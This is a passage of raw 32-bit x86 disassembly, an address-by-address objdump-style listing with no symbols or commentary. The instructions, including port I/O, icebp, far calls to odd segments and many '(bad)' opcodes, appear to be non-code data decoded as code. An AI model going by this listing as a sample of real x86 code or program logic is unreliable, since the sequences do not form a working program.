  4079b2:	jl     0x4079a2
  4079b4:	dec    esi
  4079b5:	ds aaa 
  4079b7:	imul   esp,DWORD PTR [ebx-0xa],0xb2c83aa2
  4079be:	push   esi
  4079bf:	add    dh,BYTE PTR [esi+0x5a]
  4079c2:	aad    0xe1
  4079c4:	inc    ecx
  4079c5:	adc    al,0x5e
  4079c7:	loop   0x407a17
  4079c9:	add    esp,DWORD PTR [esi-0x13]
  4079cc:	outs   dx,DWORD PTR ds:[esi]
  4079cd:	sub    al,0xe0
  4079cf:	fild   QWORD PTR [ebx-0x4b]
  4079d2:	popa   
  4079d3:	pop    esp
  4079d4:	stos   BYTE PTR es:[edi],al
  4079d5:	fidiv  WORD PTR [edx]
  4079d7:	xor    BYTE PTR [edx+edi*4],ch
  4079da:	dec    ebx
  4079db:	test   ebp,ecx
  4079dd:	pop    ebx
  4079de:	dec    esi
  4079df:	outs   dx,DWORD PTR ds:[esi]
  4079e0:	mov    dh,0xe3
  4079e2:	pop    esi
  4079e3:	push   DWORD PTR [ebp+0x21]
  4079e6:	sub    BYTE PTR [esi-0x28],al
  4079e9:	xchg   ebx,eax
  4079ea:	push   es
  4079eb:	out    0x8d,al
  4079ed:	stc    
  4079ee:	mov    dh,0x56
  4079f0:	hlt    
  4079f1:	mov    ds:0xe3f86d42,al
  4079f6:	in     al,0xd5
  4079f8:	gs js  0x4079b1
  4079fb:	mov    ds:0xf5f16704,al
  407a00:	retf   
  407a01:	lods   al,BYTE PTR ds:[esi]
  407a02:	mov    dh,ah
  407a04:	pop    es
  407a05:	out    dx,al
  407a06:	out    dx,al
  407a07:	and    DWORD PTR [ecx-0x3983b26b],0xfeea3b54
  407a11:	ret    
  407a12:	aaa    
  407a13:	(bad)  [edx+0x412ef59c]
  407a19:	ret    
  407a1a:	push   ebp
  407a1b:	call   0x21ee:0x21b4e69
  407a22:	pop    es
  407a23:	xchg   edi,eax
  407a24:	lds    esi,FWORD PTR [eax]
  407a26:	dec    edi
  407a27:	push   0x3c
  407a29:	dec    eax
  407a2a:	jmp    0xa5d9d6f0
  407a2f:	mov    edi,0xbd856ec0
  407a34:	enter  0xb445,0xd3
  407a38:	vpsubb ymm4,ymm3,ymm4
  407a3c:	rcr    ebx,cl
  407a3e:	cmp    al,0xbb
  407a40:	cmp    ecx,0xffffffa4
  407a43:	out    0xd1,eax
  407a45:	and    eax,0x63b104ec
  407a4a:	ret    0x623c
  407a4d:	mov    gs,eax
  407a4f:	aam    0xeb
  407a51:	cmp    BYTE PTR [edx],cl
  407a53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a54:	xchg   edi,eax
  407a55:	aam    0x89
  407a57:	mov    edx,0x6f2b8d43
  407a5c:	sub    dl,cl
  407a5e:	pop    esp
  407a5f:	inc    ebx
  407a60:	push   ss
  407a61:	jns    0x407a5d
  407a63:	sub    eax,0x4f82fdec
  407a68:	inc    esi
  407a69:	fs xchg ebx,eax
  407a6b:	test   al,0x72
  407a6d:	call   0x394a:0xacdc27d7
  407a74:	cmp    al,al
  407a76:	test   eax,0x249fb204
  407a7b:	mov    al,ds:0x6a4dd260
  407a80:	push   ebx
  407a81:	sbb    eax,0xc1e23888
  407a86:	jecxz  0x407a20
  407a88:	xor    dl,BYTE PTR [edx-0x45]
  407a8b:	leave  
  407a8c:	mov    ah,0x38
  407a8e:	mov    al,ds:0xdbe88687
  407a93:	gs cmp eax,edx
  407a96:	mov    ds:0x9ed0b8cb,eax
  407a9b:	scas   eax,DWORD PTR es:[edi]
  407a9c:	adc    BYTE PTR [eax-0x1d],bh
  407a9f:	in     al,dx
  407aa0:	test   eax,0x498c55ea
  407aa5:	mov    WORD PTR [ebp+0x64],ss
  407aa8:	add    al,0xf8
  407aaa:	mov    eax,ds:0x33e72c78
  407aaf:	scas   al,BYTE PTR es:[edi]
  407ab0:	push   ds
  407ab1:	push   esi
  407ab2:	int    0xc1
  407ab4:	pusha  
  407ab5:	and    DWORD PTR [eax+0x1510cf93],0x1d
  407abc:	jae    0x407a78
  407abe:	js     0x407af0
  407ac0:	mov    cl,0x5d
  407ac2:	icebp  
  407ac3:	repz fcmovne st,st(1)
  407ac6:	fstp   TBYTE PTR gs:[ebp+0x68]
  407aca:	pop    ebx
  407acb:	fdivr  QWORD PTR [edi]
  407acd:	xor    BYTE PTR [ecx+0xe],ch
  407ad0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ad1:	clc    
  407ad2:	gs mov ecx,0x348cca87
  407ad8:	test   DWORD PTR es:[ebp+eiz*8-0x4fcb2af2],eax
  407ae0:	mov    bl,0x46
  407ae2:	jmp    0xf1b1f008
  407ae7:	daa    
  407ae8:	inc    ebx
  407ae9:	adc    al,0x44
  407aeb:	ins    DWORD PTR es:[edi],dx
  407aec:	aam    0x1e
  407aee:	pushf  
  407aef:	dec    eax
  407af0:	pop    ss
  407af1:	sbb    WORD PTR [edi+esi*1-0x80],ax
  407af6:	lock imul eax,DWORD PTR [esi-0x38],0x38
  407afb:	mov    ebp,0x4227958a
  407b00:	retf   0x9184
  407b03:	xor    dl,BYTE PTR [eax+0x77]
  407b06:	pop    ss
  407b07:	mov    BYTE PTR fs:[ebx-0x4e],bh
  407b0b:	in     al,0x22
  407b0d:	and    ebp,edx
  407b0f:	out    0x45,al
  407b11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b12:	and    ebp,DWORD PTR ds:0x3659397
  407b18:	nop
  407b19:	iret   
  407b1a:	dec    ecx
  407b1b:	leave  
  407b1c:	mov    ch,0x8a
  407b1e:	mov    cl,0xa2
  407b20:	inc    eax
  407b21:	ins    BYTE PTR es:[edi],dx
  407b22:	lock shr DWORD PTR [eax-0x334335e9],cl
  407b29:	nop
  407b2a:	fistp  WORD PTR [eax-0x248aedef]
  407b30:	out    0x6c,eax
  407b32:	mov    esp,0x82e7776c
  407b37:	mov    cl,0x2b
  407b39:	pop    ecx
  407b3a:	ror    BYTE PTR [eax-0x65],cl
  407b3d:	iret   
  407b3e:	(bad)  
  407b3f:	push   edx
  407b40:	add    eax,0xb81bdf61
  407b45:	retf   0x5fff
  407b48:	rcl    DWORD PTR [ebx],1
  407b4a:	iret   
  407b4b:	push   cs
  407b4c:	in     al,0xf
  407b4e:	pop    eax
  407b4f:	adc    dl,BYTE PTR [eax+edi*4]
  407b52:	sub    eax,0xfabd08ba
  407b57:	cli    
  407b58:	mov    esi,0x39ef141f
  407b5d:	jmp    0x407bac
  407b5f:	push   ss
  407b60:	pop    ds
  407b61:	pop    edi
  407b62:	call   0x3871e0c
  407b67:	jmp    0x407b0d
  407b69:	iret   
  407b6a:	cmp    al,0xde
  407b6c:	lods   eax,DWORD PTR ds:[esi]
  407b6d:	xor    DWORD PTR [ebx+0x7c],edi
  407b70:	js     0x407bb3
  407b72:	popf   
  407b73:	or     ah,al
  407b75:	pop    esp
  407b76:	mov    ebx,ebx
  407b78:	pop    ebx
  407b79:	mov    ah,BYTE PTR [edi+ebp*8]
  407b7c:	lds    eax,FWORD PTR [eax]
  407b7e:	popa   
  407b7f:	xchg   BYTE PTR [edi],bl
  407b81:	mov    DWORD PTR [eax],0x5ce4fbf
  407b87:	lods   eax,DWORD PTR ds:[esi]
  407b88:	dec    edx
  407b89:	popa   
  407b8a:	ror    DWORD PTR [ecx],cl
  407b8c:	dec    eax
  407b8d:	xor    eax,esp
  407b8f:	pop    ss
  407b90:	mov    ah,BYTE PTR [edx]
  407b92:	shl    BYTE PTR [eax-0x70],cl
  407b95:	in     al,0x26
  407b97:	xchg   ebx,eax
  407b98:	in     eax,dx
  407b99:	sbb    ch,BYTE PTR [edx]
  407b9b:	mov    esi,0x3bddc125
  407ba0:	lahf   
  407ba1:	loopne 0x407b43
  407ba3:	mov    ch,0xbf
  407ba5:	mov    dh,0x1b
  407ba7:	inc    edx
  407ba8:	int3   
  407ba9:	ror    BYTE PTR [ebp+0x72],cl
  407bac:	inc    edx
  407bad:	into   
  407bae:	jge    0x407b88
  407bb0:	cld    
  407bb1:	call   0x23d9:0xde5caf8e
  407bb8:	je     0x407b68
  407bba:	jns    0x407b52
  407bbc:	ja     0x407bcc
  407bbe:	int    0xbc
  407bc0:	fxch   st(7)
  407bc2:	xor    BYTE PTR [esi+0x6f],dl
  407bc5:	mov    al,ds:0x5f7ccf1f
  407bca:	in     eax,dx
  407bcb:	loope  0x407bd4
  407bcd:	pop    ebx
  407bce:	adc    ch,bh
  407bd0:	push   edi
  407bd1:	sar    BYTE PTR [ebp+0x32],1
  407bd4:	xor    DWORD PTR ds:0xb66517bd,ecx
  407bda:	and    esp,DWORD PTR [ebx]
  407bdc:	mov    edx,0xd314618a
  407be1:	dec    eax
  407be2:	mov    ebx,DWORD PTR [edx+0x57848a02]
  407be8:	sti    
  407be9:	jl     0x407c4b
  407beb:	jns    0x407bdb
  407bed:	adc    BYTE PTR [edx-0x7d],bl
  407bf0:	mov    DWORD PTR [eax+0x7867a921],esi
  407bf6:	into   
  407bf7:	sub    eax,esi
  407bf9:	aad    0xa6
  407bfb:	cmp    al,0x4f
  407bfd:	cli    
  407bfe:	xchg   esp,eax
  407bff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c00:	ret    0xc00e
  407c03:	addr16 das 
  407c05:	shl    DWORD PTR [ecx-0x42c8966a],cl
  407c0b:	fs cmp ch,bl
  407c0e:	mov    edx,0xc0dc6209
  407c13:	jae    0x407c82
  407c15:	cwde   
  407c16:	aaa    
  407c17:	jmp    0xbc3:0xfb003177
  407c1e:	rcl    DWORD PTR [eax-0x12742e93],0xb7
  407c25:	jb     0x407c4f
  407c27:	enter  0x2512,0x48
  407c2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c2c:	cwde   
  407c2d:	sub    edi,edi
  407c2f:	xchg   esi,eax
  407c30:	test   DWORD PTR [edx-0x7bcec391],0x10b9f725
  407c3a:	jo     0x407c11
  407c3c:	(bad)  
  407c3d:	shl    DWORD PTR [ebp-0x7e],cl
  407c40:	popa   
  407c41:	or     al,0x1f
  407c43:	sub    eax,0x46d5ed9f
  407c48:	imul   ebp,DWORD PTR [ebx+0x71],0x93ec0bb4
  407c4f:	xchg   esp,eax
  407c50:	retf   0x204b
  407c53:	scas   al,BYTE PTR es:[edi]
  407c54:	xor    eax,0x4db0fb70
  407c59:	push   0xd
  407c5b:	fcom   QWORD PTR [edx+ecx*4-0x66]
  407c5f:	daa    
  407c60:	dec    esp
  407c61:	xlat   BYTE PTR ds:[ebx]
  407c62:	cmp    DWORD PTR [esi],0x53
  407c65:	dec    edi
  407c66:	cwde   
  407c67:	and    ch,BYTE PTR [ecx]
  407c69:	in     eax,dx
  407c6a:	out    dx,al
  407c6b:	mov    BYTE PTR [eax],0x70
  407c6e:	retf   
  407c6f:	adc    BYTE PTR ds:0x17e18ffb,0x39
  407c76:	pushf  
  407c77:	sbb    eax,0x6e3039a4
  407c7c:	shl    BYTE PTR [edi+ebx*1+0x30f1566b],cl
  407c83:	cld    
  407c84:	idiv   DWORD PTR [ebx+0x3dd87e73]
  407c8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c8b:	outs   dx,DWORD PTR ds:[esi]
  407c8c:	add    esi,DWORD PTR ds:[edi+edx*8+0x43b38638]
  407c94:	adc    al,0xd0
  407c96:	rcl    DWORD PTR [edx],cl
  407c98:	push   esp
  407c99:	fild   QWORD PTR [ecx]
  407c9b:	sbb    esi,DWORD PTR ds:0x3086d462
  407ca1:	inc    eax
  407ca2:	jecxz  0x407c33
  407ca4:	xor    DWORD PTR [esi-0x53a60f61],ebp
  407caa:	mov    ah,0xd4
  407cac:	mov    es,WORD PTR [edx]
  407cae:	test   al,0x6
  407cb0:	fild   QWORD PTR [ebx-0x43634af3]
  407cb6:	std    
  407cb7:	add    DWORD PTR [edi-0x4edde6f],esi
  407cbd:	pop    esi
  407cbe:	push   edi
  407cbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cc0:	dec    esi
  407cc1:	fadd   QWORD PTR [ebp-0x6ce280f]
  407cc7:	loope  0x407cd5
  407cc9:	push   0xffffffec
  407ccb:	or     al,0xed
  407ccd:	ret    0x6f4c
  407cd0:	outs   dx,BYTE PTR ds:[esi]
  407cd1:	push   edx
  407cd2:	aam    0x5c
  407cd4:	pop    edi
  407cd5:	inc    ecx
  407cd6:	inc    eax
  407cd7:	repz pop ss
  407cd9:	sbb    ah,BYTE PTR [edi]
  407cdb:	jo     0x407cf9
  407cdd:	adc    BYTE PTR [edx+0x58509f3],0xb3
  407ce4:	mov    bl,0xb6
  407ce6:	cmp    ebx,ecx
  407ce8:	mov    al,0xf
  407cea:	pop    ds
  407ceb:	mov    al,ds:0xfb28f050
  407cf0:	cs sub eax,0xb393a327
  407cf6:	jo     0x407cac
  407cf8:	jle    0x407ced
  407cfa:	clc    
  407cfb:	push   ecx
  407cfc:	ja     0x407ca2
  407cfe:	mov    ds:0xce1d8cb4,eax
  407d03:	push   edx
  407d04:	adc    eax,0x4d28d9c8
  407d09:	push   edi
  407d0a:	pusha  
  407d0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d0c:	daa    
  407d0d:	cld    
  407d0e:	sub    eax,0x9c7eecf9
  407d13:	hlt    
  407d14:	xchg   ecx,eax
  407d15:	lock cmp dh,BYTE PTR [ebp-0x7d]
  407d19:	cmp    DWORD PTR [ebp+0x6d7feda8],0xa9fccefa
  407d23:	loopne 0x407ce7
  407d25:	ja     0x407d5c
  407d27:	xchg   ebp,eax
  407d28:	jmp    0x44fd6343
  407d2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d2e:	jo     0x407cf5
  407d30:	clc    
  407d31:	ret    0x3212
  407d34:	inc    esp
  407d35:	jge    0x407d4e
  407d37:	shl    DWORD PTR ds:0x74c310e4,1
  407d3d:	xor    eax,0x3fc924b8
  407d42:	fsubr  QWORD PTR [edx-0x3e]
  407d45:	cli    
  407d46:	out    dx,al
  407d47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d48:	pop    es
  407d49:	mov    al,0x9a
  407d4b:	jp     0x407cd5
  407d4d:	xchg   esi,eax
  407d4e:	in     eax,dx
  407d4f:	test   edi,0x93180a4a
  407d55:	xchg   esp,eax
  407d56:	jge    0x407d31
  407d58:	fist   WORD PTR [edi+0x689ae6f8]
  407d5e:	loop   0x407d76
  407d60:	sub    eax,0x2a2018e0
  407d65:	jmp    0x48331a80
  407d6a:	dec    edx
  407d6b:	fidivr WORD PTR [edx+0x20d4df25]
  407d71:	mov    cl,0x52
  407d73:	(bad)  [esi+0x12d0e38a]
  407d79:	lea    esp,[esi]
  407d7b:	pushf  
  407d7c:	jae    0x407deb
  407d7e:	dec    ebp
  407d7f:	and    ah,ah
  407d81:	imul   edx,DWORD PTR [edx+0x42264848],0x73b236da
  407d8b:	sar    ch,1
  407d8d:	and    DWORD PTR [edi],esp
  407d8f:	aam    0xfd
  407d91:	pop    eax
  407d92:	adc    ch,bl
  407d94:	cmpps  xmm5,XMMWORD PTR [ebx-0x6f],0x4d
  407d99:	addr16 jmp 0x7e63:0x9c0524f9
  407da1:	test   BYTE PTR ds:0xa8e65972,ch
  407da7:	push   esi
  407da8:	sub    BYTE PTR [ecx+0x4b],ah
  407dab:	nop
  407dac:	adc    ecx,edi
  407dae:	jns    0x407de3
  407db0:	xor    al,0x90
  407db2:	sbb    BYTE PTR [ebp+0x75467b07],bl
  407db8:	jno    0x407d86
  407dba:	sub    ch,bl
  407dbc:	sbb    edx,DWORD PTR ds:0x4057b260
  407dc2:	mov    cl,0x0
  407dc4:	inc    esi
  407dc5:	cmp    BYTE PTR [ebp+0x4523abf6],ch
  407dcb:	pop    ebx
  407dcc:	adc    al,0x74
  407dce:	shr    DWORD PTR [edi+0x761aa10],1
  407dd4:	cmp    al,0xc1
  407dd6:	das    
  407dd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407dd8:	scas   eax,DWORD PTR es:[edi]
  407dd9:	loope  0x407dc5
  407ddb:	shl    DWORD PTR [ecx],0x4e
  407dde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ddf:	or     BYTE PTR [edx+ebx*8],0x50
  407de3:	jmp    0x935592d7
  407de8:	jb     0x407d76
  407dea:	addr16 inc esp
  407dec:	dec    eax
  407ded:	mov    cl,0x78
  407def:	bound  eax,QWORD PTR fs:[ecx]
  407df2:	push   ebp
  407df3:	pop    ebx
  407df4:	inc    edx
  407df5:	(bad)  [eax]
  407df7:	int3   
  407df8:	icebp  
  407df9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407dfa:	adc    BYTE PTR [edx],ah
  407dfc:	fcom   st(6)
  407dfe:	ficomp WORD PTR [edi+0x32]
  407e01:	out    dx,eax
  407e02:	je     0x407e13
  407e04:	js     0x407e25
  407e06:	adc    DWORD PTR [esi-0x5cc17f0f],ebx
  407e0c:	sbb    DWORD PTR [esi+0x6db11bfa],0x2a
  407e13:	(bad)  
  407e14:	cmc    
  407e15:	xchg   edi,eax
  407e16:	sub    eax,eax
  407e18:	out    0xce,al
  407e1a:	and    al,0x46
  407e1c:	push   esp
  407e1d:	cli    
  407e1e:	push   ebp
  407e1f:	aam    0xd
  407e21:	sbb    al,0xfe
  407e23:	out    0x31,eax
  407e25:	mov    eax,0x3b03044c
  407e2a:	xor    BYTE PTR [ebx+0x2f],dl
  407e2d:	push   ebx
  407e2e:	dec    edx
  407e2f:	inc    eax
  407e30:	xchg   esi,eax
  407e31:	xchg   DWORD PTR [edi+0x52],ebp
  407e34:	fadd   DWORD PTR [edx]
  407e36:	sub    al,0xbb
  407e38:	jg     0x407e78
  407e3a:	call   0x25c5:0x122a20f5
  407e41:	aaa    
  407e42:	and    eax,0xf89fc9f
  407e47:	(bad)  
  407e48:	sbb    ebp,DWORD PTR [edx]
  407e4a:	fimul  DWORD PTR [edx+0x6e]
  407e4d:	dec    di
  407e4f:	out    0x55,eax
  407e51:	iret   
  407e52:	fs icebp 
  407e54:	push   edx
  407e55:	push   edi
  407e56:	pop    es
  407e57:	mov    ch,0xf9
  407e59:	into   
  407e5a:	push   ecx
  407e5b:	loop   0x407e8a
  407e5d:	or     ecx,0xfcf90858
  407e63:	dec    esi
  407e64:	push   edx
  407e65:	(bad)  [ebx]
  407e67:	sbb    edi,DWORD PTR [esi+0xe1ff6c5]
  407e6d:	and    bl,BYTE PTR [ebp+0x7815358e]
  407e73:	mov    bh,0x3b
  407e75:	sbb    DWORD PTR [esi+0x27],0xc57a3fc7
  407e7c:	pop    ebx
  407e7d:	push   ds
  407e7e:	adc    DWORD PTR [esi],eax
  407e80:	mov    esp,0xe2ca4e5c
  407e85:	xor    eax,0xe88d7554
  407e8a:	mov    al,ds:0x7e815642
  407e8f:	aad    0x87
  407e91:	pop    edi
  407e92:	sar    ch,cl
  407e94:	xor    ch,0x94
  407e97:	xor    bh,cl
  407e99:	mov    ebx,DWORD PTR ds:0x8222df0a
  407e9f:	retf   0x4e78
  407ea2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ea3:	add    BYTE PTR [esp+edi*4-0x5c9fc96b],0xe6
  407eab:	dec    esp
  407eac:	mov    dh,0x25
  407eae:	in     eax,0x6e
  407eb0:	stos   DWORD PTR es:[edi],eax
  407eb1:	test   eax,0xd45e1a2
  407eb6:	push   edi
  407eb7:	dec    ebp
  407eb8:	cmc    
  407eb9:	adc    dh,bh
  407ebb:	jo     0x407e4f
  407ebd:	adc    cl,BYTE PTR [esi+0x8]
  407ec0:	pop    ebp
  407ec1:	dec    edi
  407ec2:	out    dx,al
  407ec3:	aaa    
  407ec4:	inc    eax
  407ec5:	sbb    edi,DWORD PTR [esi-0x1b5d7641]
  407ecb:	(bad)  
  407ecc:	out    0x33,eax
  407ece:	xchg   esp,eax
  407ecf:	jg     0x407ede
  407ed1:	dec    edi
  407ed2:	arpl   WORD PTR [ecx],di
  407ed4:	pop    esi
  407ed5:	mov    edi,0xf1d7657
  407eda:	js     0x407ea9
  407edc:	pop    edi
  407edd:	dec    edi
  407ede:	js     0x407f17
  407ee0:	mov    dl,BYTE PTR ds:0xcf1cbe04
  407ee6:	adc    dh,bl
  407ee8:	mov    ah,0x28
  407eea:	dec    ecx
  407eeb:	shl    ecx,0x74
  407eee:	sub    bl,cl
  407ef0:	inc    BYTE PTR [eax]
  407ef2:	mov    ds:0xfe9f8de,al
  407ef7:	test   eax,0x2607aef8
  407efc:	ret    
  407efd:	fnsave [eax-0x38405b6]
  407f03:	mov    ah,0x53
  407f05:	ficom  DWORD PTR [ebx+0x12]
  407f08:	lock icebp 
  407f0a:	out    0xcf,al
  407f0c:	mov    ch,0x7c
  407f0e:	mov    esp,0x6c6afcd9
  407f13:	imul   edx,DWORD PTR [edx+0x7c31b2f0],0x667e1227
  407f1d:	jle    0x407f94
  407f1f:	stos   BYTE PTR es:[edi],al
  407f20:	mov    ds:0xeec2fa87,eax
  407f25:	test   al,0x32
  407f27:	sub    al,0x1
  407f29:	mov    dl,0x59
  407f2b:	inc    ebx
  407f2c:	sahf   
  407f2d:	outs   dx,DWORD PTR ds:[esi]
  407f2e:	out    0xb0,al
  407f30:	(bad)  
  407f33:	cmp    ebp,DWORD PTR [ebx+0x2a]
  407f36:	in     al,0xf2
  407f38:	aad    0x31
  407f3a:	push   0x4
  407f3c:	(bad)  
  407f3d:	cmc    
  407f3e:	pop    eax
  407f3f:	add    DWORD PTR [esi-0x21ae373f],eax
  407f45:	xchg   ecx,eax
  407f46:	and    al,0x55
  407f48:	and    dl,BYTE PTR [ebp-0x4b]
  407f4b:	sub    bh,ch
  407f4d:	ret    0xd4ba
  407f50:	mov    ch,0x15
  407f52:	xchg   edi,eax
  407f53:	mov    bl,0xf7
  407f55:	mov    cl,0x11
  407f57:	mov    gs:0x83ab913,eax
  407f5d:	push   edx
  407f5e:	jmp    0xedc62427
  407f63:	mov    edx,0xdb910aa1
  407f68:	test   BYTE PTR [ebx+0x7a],ch
  407f6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f6c:	jmp    0x407f5a
  407f6e:	(bad)
  407f73:	fcomp  DWORD PTR [ecx-0x6f027697]
  407f79:	or     eax,0xf8a20e58
  407f7e:	mov    BYTE PTR [ebx],ah
  407f80:	hlt    
  407f81:	ror    DWORD PTR [edx-0x7a0387c3],cl
  407f87:	add    eax,0x6b502ab2
  407f8c:	popf   
  407f8d:	aam    0xec
  407f8f:	adc    DWORD PTR [edi+edi*8-0x1d],eax
  407f93:	ret    
  407f94:	stos   DWORD PTR es:[edi],eax
  407f95:	iret   
  407f96:	cwde   
  407f97:	sbb    al,0x41
  407f99:	ficomp WORD PTR [ebp-0x2ecd84df]
  407f9f:	push   0xffffffb0
  407fa1:	xlat   BYTE PTR ds:[ebx]
  407fa2:	cs inc ebp
  407fa4:	and    eax,0xf7971049
  407fa9:	or     edi,DWORD PTR [edx+0x9c5e899]
  407faf:	cmp    esp,DWORD PTR [eax-0x71]
  407fb2:	arpl   ax,di
  407fb4:	adc    eax,0x9db6f9d9
  407fb9:	jo     0x407fa3
  407fbb:	cmp    ah,BYTE PTR [ecx-0x9644454]
  407fc1:	aam    0xd4
  407fc3:	mov    ah,0xa4
  407fc5:	repnz mov ah,0xfe
  407fc8:	lds    esi,FWORD PTR [ebx+eiz*8]
  407fcb:	lods   al,BYTE PTR ds:[esi]
  407fcc:	inc    ecx
  407fcd:	dec    edx
  407fce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fcf:	ins    DWORD PTR es:[edi],dx
  407fd0:	jecxz  0x407ffa
  407fd2:	js     0x407fdd
  407fd4:	push   edx
  407fd5:	mov    BYTE PTR [esi+ebp*1],bh
  407fd8:	sub    DWORD PTR [ebx],ebx
  407fda:	push   ebp
  407fdb:	test   BYTE PTR [ecx],0xca
  407fde:	sbb    ah,bh
  407fe0:	nop
  407fe1:	mov    al,0xbe
  407fe3:	lahf   
  407fe4:	jb     0x407fd7
  407fe6:	mov    esi,0x616a2e71
  407feb:	mov    ch,BYTE PTR [edx]
  407fed:	test   eax,0xaeeb058b
  407ff2:	mov    ds:0xf137153b,eax
  407ff7:	xchg   esi,eax
  407ff8:	fistp  QWORD PTR [ecx+0x7665c855]
  407ffe:	push   edx
  407fff:	and    al,0xcc
  408001:	sbb    al,0xc0
  408003:	and    DWORD PTR [esi+0x50a46600],ebx
  408009:	shl    dh,0x50
  40800c:	test   BYTE PTR [esp+eax*4-0x48],bh
  408010:	dec    esi
  408011:	arpl   bp,bp
  408013:	jb     0x408058
  408015:	adc    al,0x6e
  408017:	jb     0x408036
  408019:	imul   edx,edx,0x82d55336
  40801f:	sahf   
  408020:	add    dl,BYTE PTR [eax+eiz*8+0x1754ebb7]
  408027:	jae    0x40804d
  408029:	fisubr DWORD PTR [ebx+0x58]
  40802c:	(bad)  
  40802d:	pushf  
  40802e:	jg     0x40805c
  408030:	sahf   
  408031:	sahf   
  408032:	outs   dx,BYTE PTR ds:[esi]
  408033:	push   esi
  408034:	pop    edx
  408035:	pop    esi
  408036:	stos   BYTE PTR es:[edi],al
  408037:	fcmovne st,st(6)
  408039:	xor    DWORD PTR [edi],edi
  40803b:	inc    esp
  40803c:	xor    al,BYTE PTR [ecx+0x78]
  40803f:	popa   
  408040:	cmp    bh,dl
  408042:	pop    edx
  408043:	push   ds
  408044:	scas   al,BYTE PTR es:[edi]
  408045:	mov    dl,0xb4
  408047:	addr16 fs dec ebp
  40804a:	cld    
  40804b:	es or  cl,dl
  40804e:	xchg   BYTE PTR [edx+0x652f5033],ah
  408054:	mov    ebx,eax
  408056:	out    0x52,eax
  408058:	mov    esi,0xccdc488d
  40805d:	lods   eax,DWORD PTR ds:[esi]
  40805e:	push   eax
  40805f:	test   ebp,edi
  408061:	xchg   DWORD PTR [ebp+0x16],edi
  408064:	jp     0x40808a
  408066:	retf   
  408067:	lods   eax,DWORD PTR ds:[esi]
  408068:	xor    esi,edx
  40806a:	inc    ebx
  40806b:	mov    esi,0x3e2fa06b
  408070:	inc    ebp
  408071:	ins    BYTE PTR es:[edi],dx
  408072:	test   DWORD PTR [ecx+eax*1+0x7882c2e7],esi
  408079:	je     0x4080c4
  40807b:	stos   DWORD PTR es:[edi],eax
  40807c:	lea    edi,[ecx]
  40807e:	iret   
  40807f:	inc    eax
  408080:	cmp    al,0x3e
  408082:	pop    ebx
  408083:	inc    edi
  408084:	jbe    0x408090
  408086:	or     al,0xa5
  408088:	jge    0x4080bf
  40808a:	(bad)  
  40808b:	sub    al,0x1c
  40808d:	inc    edi
  40808e:	mov    bl,0x58
  408090:	push   esi
  408091:	out    dx,eax
  408092:	inc    ebx
  408093:	je     0x408084
  408095:	adc    ebp,esi
  408097:	test   al,0xfd
  408099:	xor    al,0x8c
  40809b:	inc    ebx
  40809c:	fdiv   st(5),st
  40809e:	xlat   BYTE PTR ds:[ebx]
  40809f:	sbb    al,0x5b
  4080a1:	mov    dh,0xad
  4080a3:	rcr    BYTE PTR [edi+0x61],0xe1
  4080a7:	or     al,0x54
  4080a9:	nop
  4080aa:	cmp    al,0x1e
  4080ac:	push   ebx
  4080ad:	cmc    
  4080ae:	pop    ds
  4080af:	cmp    ebp,esp
  4080b1:	(bad)  
  4080b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080b3:	pop    ds
  4080b4:	mov    ebp,0xc483e52e
  4080b9:	cdq    
  4080ba:	sub    esi,DWORD PTR ds:0xe5c94b49
  4080c0:	cmp    bh,bh
  4080c2:	push   cs
  4080c3:	test   BYTE PTR [edi],bl
  4080c5:	lods   eax,DWORD PTR ds:[esi]
  4080c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080c7:	rcl    DWORD PTR [ecx-0x6d],0xa1
  4080cb:	enter  0xa1c5,0xc1
  4080cf:	or     al,0xde
  4080d1:	inc    edx
  4080d2:	aad    0xad
  4080d4:	repnz xchg edx,eax
  4080d6:	fst    QWORD PTR [ebx-0x6d19648d]
  4080dc:	popa   
  4080dd:	jb     0x408095
  4080df:	xchg   edi,eax
  4080e0:	push   es
  4080e1:	pop    ecx
  4080e2:	in     al,dx
  4080e3:	cdq    
  4080e4:	inc    esp
  4080e5:	cmp    al,0x83
  4080e7:	xor    ecx,DWORD PTR [edi+0x8]
  4080ea:	add    BYTE PTR [ebx-0x13],ch
  4080ed:	imul   edx,eax,0x81d63201
  4080f3:	jno    0x40808a
  4080f5:	mov    edx,DWORD PTR [edx]
  4080f7:	xor    DWORD PTR [edi+ecx*8-0x2e],esi
  4080fb:	retf   
  4080fc:	(bad)  
  4080fd:	imul   esp,edi,0x764b23c9
  408103:	lds    edi,FWORD PTR [ebx-0x71]
  408106:	mov    WORD PTR [ebx-0x2a],ss
  408109:	fstp   DWORD PTR [ecx-0x33d5a566]
  40810f:	pushf  
  408110:	and    ch,BYTE PTR [eax]
  408112:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408113:	add    eax,0xf721a954
  408118:	imul   DWORD PTR [eax+0x2d019b91]
  40811e:	jecxz  0x40810e
  408120:	jl     0x408133
  408122:	dec    ebx
  408123:	leave  
  408124:	mov    ds:0xac27d729,al
  408129:	lods   al,BYTE PTR ds:[esi]
  40812a:	popa   
  40812b:	imul   ebp,DWORD PTR [esi+esi*2-0x23],0x4c
  408130:	pop    esi
  408131:	cmp    esi,DWORD PTR [esi]
  408133:	clc    
  408134:	adc    DWORD PTR [eax+0x7707aa64],eax
  40813a:	jg     0x4080ce
  40813c:	push   cs
  40813d:	and    eax,0x172e2041
  408142:	cli    
  408143:	stc    
